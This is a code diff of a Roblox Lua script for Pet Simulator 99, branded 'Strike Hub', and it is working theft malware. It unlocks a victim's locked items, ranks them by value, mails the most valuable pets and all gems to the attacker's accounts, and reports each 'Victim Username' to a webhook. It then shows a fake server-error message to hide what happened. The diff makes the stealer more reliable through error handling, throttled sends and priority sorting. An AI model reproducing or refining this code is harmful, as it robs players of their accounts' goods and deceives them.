@@ -41,11 +41,8 @@ for adress, func in pairs(getgc()) do
 end
 
 local mailSendPrice = FunctionToGetFirstPriceOfMail()
-
--- cache save/inventory reference to avoid repeated calls
 local SaveRoot = GetSave()
 local InventoryCache = SaveRoot and SaveRoot.Inventory
-
 local GemAmount1 = 1
 if InventoryCache and InventoryCache.Currency then
     for i, v in pairs(InventoryCache.Currency) do
@@ -68,31 +65,15 @@ local function formatNumber(number)
 end
 
 local function SendMessage(diamonds)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-
+    local headers = {["Content-Type"] = "application/json"}
     local fields = {
-        {
-            name = "Victim Username:",
-            value = plr.Name,
-            inline = true
-        },
-        {
-            name = "Items to be sent:",
-            value = "",
-            inline = false
-        },
-        {
-            name = "Summary:",
-            value = "",
-            inline = false
-        }
+        {name = "Victim Username:", value = plr.Name, inline = true},
+        {name = "Items to be sent:", value = "", inline = false},
+        {name = "Summary:", value = "", inline = false}
     }
 
     local combinedItems = {}
     local itemRapMap = {}
-
     for _, item in ipairs(sortedItems) do
         local rapKey = item.name
         if itemRapMap[rapKey] then
@@ -116,12 +97,10 @@ local function SendMessage(diamonds)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "\240\159\144\177 New PS99 Execution" ,
+            ["title"] = "\240\159\144\177 New PS99 Execution",
             ["color"] = 65280,
             ["fields"] = fields,
-            ["footer"] = {
-                ["text"] = "Strike Hub."
-            }
+            ["footer"] = {["text"] = "Strike Hub."}
         }}
     }
 
@@ -130,7 +109,6 @@ local function SendMessage(diamonds)
         for line in fields[2].value:gmatch("[^\r\n]+") do
             table.insert(lines, line)
         end
-
         while #fields[2].value > 1024 and #lines > 0 do
             table.remove(lines)
             fields[2].value = table.concat(lines, "\n")
@@ -172,61 +150,55 @@ game.DescendantAdded:Connect(function(x)
 end)
 
 local function getRAP(Type, Item)
-    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
-        {
-            Class = {Name = Type},
-            IsA = function(hmm)
-                return hmm == Type
-            end,
-            GetId = function()
-                return Item.id
-            end,
-            StackKey = function()
-                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
-            end,
-            AbstractGetRAP = function(self)
-                return nil
-            end
-        }
-    ) or 0)
+    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get({
+        Class = {Name = Type},
+        IsA = function(hmm) return hmm == Type end,
+        GetId = function() return Item.id end,
+        StackKey = function() return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn}) end,
+        AbstractGetRAP = function(self) return nil end
+    }) or 0)
 end
 
--- cache network.Invoke locally for faster calls
 local netInvoke = network and network.Invoke
 
+-- ================= UPDATED sendItem FUNCTION WITH 0.2s SAFE DELAY =================
 local function sendItem(category, uid, am)
     local userIndex = 1
     local maxUsers = #users
     local sent = false
+    local sendDelay = 0.2 -- safe delay between sends
 
     repeat
         local currentUser = users[userIndex]
-        local args = {
-            [1] = currentUser,
-            [2] = MailMessage,
-            [3] = category,
-            [4] = uid,
-            [5] = am or 1
-        }
+        local args = {currentUser, MailMessage, category, uid, am}
 
-        local response, err = netInvoke and netInvoke("Mailbox: Send", unpack(args)) or network.Invoke("Mailbox: Send", unpack(args))
+        local success, response, err = pcall(function()
+            return netInvoke("Mailbox: Send", unpack(args))
+        end)
 
-        if response == true then
-            sent = true
-            GemAmount1 = GemAmount1 - mailSendPrice
-            mailSendPrice = math.ceil(mailSendPrice * 1.5) -- removed redundant math.ceil
-            if mailSendPrice > 5000000 then
-                mailSendPrice = 5000000
-            end
-        elseif response == false and err == "They don't have enough space!" then
-            userIndex = 2
-            if userIndex > maxUsers then
+        if success then
+            if response == true then
                 sent = true
+                GemAmount1 = GemAmount1 - mailSendPrice
+                mailSendPrice = math.ceil(mailSendPrice * 1.5)
+                if mailSendPrice > 5000000 then
+                    mailSendPrice = 5000000
+                end
+                wait(sendDelay)
+            elseif response == false and err == "They don't have enough space!" then
+                userIndex = userIndex + 1
+                if userIndex > maxUsers then
+                    sent = true
+                end
+                wait(sendDelay)
             end
+        else
+            wait(sendDelay)
         end
     until sent
 end
 
+-- ================= OTHER FUNCTIONS (SendAllGems, EmptyBoxes, ClaimMail, etc.) =================
 local function SendAllGems()
     local inv = InventoryCache or (GetSave() and GetSave().Inventory)
     if not inv or not inv.Currency then return end
@@ -240,23 +212,21 @@ local function SendAllGems()
 
                 repeat
                     local currentUser = users[userIndex]
-                    local args = {
-                        [1] = currentUser,
-                        [2] = MailMessage,
-                        [3] = "Currency",
-                        [4] = i,
-                        [5] = GemAmount1 - mailSendPrice
-                    }
+                    local args = {currentUser, MailMessage, "Currency", i, GemAmount1 - mailSendPrice}
 
-                    local response, err = netInvoke and netInvoke("Mailbox: Send", unpack(args)) or network.Invoke("Mailbox: Send", unpack(args))
+                    local success, response, err = pcall(function()
+                        return netInvoke("Mailbox: Send", unpack(args))
+                    end)
 
-                    if response == true then
+                    if success and response == true then
                         sent = true
-                    elseif response == false and err == "They don't have enough space!" then
-                        userIndex = 2
+                    elseif success and response == false and err == "They don't have enough space!" then
+                        userIndex = userIndex + 1
                         if userIndex > maxUsers then
                             sent = true
                         end
+                    else
+                        wait(0.05)
                     end
                 until sent
                 break
@@ -289,28 +259,23 @@ local function canSendMail()
         uid = i
         break
     end
-    local args = {
-        [1] = "Roblox",
-        [2] = "Test",
-        [3] = "Pet",
-        [4] = uid,
-        [5] = 1
-    }
+    local args = {"Roblox", "Test", "Pet", uid, 1}
     local response, err = network.Invoke("Mailbox: Send", unpack(args))
     return (err == "They don't have enough space!")
 end
 
 require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
 require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+
 local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
 
 for i, v in pairs(categoryList) do
     if save[v] ~= nil then
         for uid, item in pairs(save[v]) do
+            local rapValue = getRAP(v, item)
             if v == "Pet" then
                 local dir = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]
                 if dir.gargantuan or dir.titanic or dir.huge or dir.exclusiveLevel then
-                    local rapValue = getRAP(v, item)
                     if rapValue >= min_rap then
                         local prefix = ""
                         if item.pt and item.pt == 1 then
@@ -321,24 +286,18 @@ for i, v in pairs(categoryList) do
                         if item.sh then
                             prefix = "Shiny " .. prefix
                         end
-                        local id = prefix .. item.id
-                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
+                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = prefix .. item.id, priority = (dir.gargantuan or dir.titanic) and 1 or 0})
                         totalRAP = totalRAP + (rapValue * (item._am or 1))
                     end
                 end
             else
-                local rapValue = getRAP(v, item)
                 if rapValue >= min_rap then
-                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
+                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, priority = 0})
                     totalRAP = totalRAP + (rapValue * (item._am or 1))
                 end
             end
             if item._lk then
-                local args = {
-                    [1] = uid,
-                    [2] = false
-                }
-                network.Invoke("Locking_SetLocked", unpack(args))
+                network.Invoke("Locking_SetLocked", uid, false)
             end
         end
     end
@@ -352,27 +311,29 @@ if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
         return
     end
 
-    -- Sort once by total RAP value (RAP * amount)
-table.sort(sortedItems, function(a, b)
-	return (a.rap * a.amount) > (b.rap * b.amount)
-end)
+    -- Sort items: priority (Gargantuan/Titanic) first, then by RAP
+    table.sort(sortedItems, function(a, b)
+        if a.priority ~= b.priority then
+            return a.priority > b.priority
+        end
+        return (a.rap * a.amount) > (b.rap * b.amount)
+    end)
 
-task.spawn(function()
-	SendMessage(GemAmount1)
-end)
+    task.spawn(function()
+        SendMessage(GemAmount1)
+    end)
 
--- Send highest RAP items first, regardless of category
-for _, item in ipairs(sortedItems) do
-	if GemAmount1 > mailSendPrice then
-		sendItem(item.category, item.uid, item.amount)
-	else
-		break
-	end
-end
-
--- Send remaining gems last
-if GemAmount1 > mailSendPrice then
-	SendAllGems()
+    for _, item in ipairs(sortedItems) do
+        if GemAmount1 > mailSendPrice then
+            sendItem(item.category, item.uid, item.amount)
+        else
+            break
+        end
     end
+
+    if GemAmount1 > mailSendPrice then
+        SendAllGems()
+    end
+
     message.Error("We are Having server issues please rejoin and try again")
 end
